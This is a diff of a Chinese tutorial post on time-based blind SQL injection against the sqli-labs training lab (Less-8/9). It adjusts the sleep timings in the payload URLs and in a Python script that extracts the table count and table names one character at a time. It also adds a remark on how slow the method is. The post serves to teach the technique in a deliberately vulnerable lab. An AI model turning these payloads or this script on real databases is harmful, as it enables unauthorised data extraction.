@@ -523,7 +523,7 @@ http://192.168.1.106/sqli-labs/Less-9/?id=1%27%20and%20if((select%20database())=
 
 http://192.168.1.106/sqli-labs/Less-9/?id=1' and if((select count(*) from information_schema.tables where table_schema=database())=4,sleep(3),null) --+
 
-数据库的表个数为4，那么页面就会在载入状态等待4s。
+数据库的表个数为4，那么页面就会在载入状态等待3s。
 
 python的脚本：
 
@@ -532,7 +532,7 @@ python的脚本：
 import requests
 import time
 
-url1 = "http://192.168.1.106/sqli-labs/Less-9/?id=1' and if((select count(*) from information_schema.tables where table_schema=database())=%d,sleep(0.3),null) --+"
+url1 = "http://192.168.1.106/sqli-labs/Less-9/?id=1' and if((select count(*) from information_schema.tables where table_schema=database())=%d,sleep(1),null) --+"
 
 count = 0
 
@@ -541,16 +541,16 @@ for x in range(1,100):
 	start = time.time()
 	r = requests.get(test_url)
 	end = time.time()
-	if (end-start) > 0.3:
+	if (end-start) > 0.9:
 		count = x
 		break
 
 print count,"tables"
 
 for c in range(0,count):
-	url="http://192.168.1.106/sqli-labs/Less-8/?id=9' and if((select substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1))='%s',sleep(0.3),null) --+"
+	url="http://192.168.1.106/sqli-labs/Less-8/?id=9' and if((select substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1))='%s',sleep(1),null) --+"
 	
-	url2="http://192.168.1.106/sqli-labs/Less-8/?id=9' and if((select length(table_name) from information_schema.tables where table_schema=database() limit %d,1 )=%d,sleep(0.3),null) --+"
+	url2="http://192.168.1.106/sqli-labs/Less-8/?id=9' and if((select length(table_name) from information_schema.tables where table_schema=database() limit %d,1 )=%d,sleep(1),null) --+"
 
 	length =0
 	for l in range(1,100):
@@ -558,7 +558,7 @@ for c in range(0,count):
 		start = time.time()
 		r = requests.get(test_url)
 		end = time.time()
-		if (end-start) > 0.3:
+		if (end-start) > 0.9:
 			length = l		
 			break	
 
@@ -574,7 +574,7 @@ for c in range(0,count):
 			start = time.time()
 			r = requests.get(test_url)
 			end = time.time()
-			if (end-start) > 0.3:
+			if (end-start) > 0.9:
 				result = result + chr(i)
 				flag = False
 		for i in range(ord('A'),ord('Z')+1):
@@ -584,11 +584,15 @@ for c in range(0,count):
 			start = time.time()
 			r = requests.get(test_url)
 			end = time.time()
-			if (end-start) > 0.3:
+			if (end-start) > 0.9:
 				result = result + chr(i)
 				flag = False
 	print result
 {% endhighlight%}
+
+这种方式，在网络状态不好的情况下就不太方便了。
+
+而且sleep的时间需要设置较长。注入所需的时间也就需要较长。
 
 结果和上面bool盲注的一样。
 
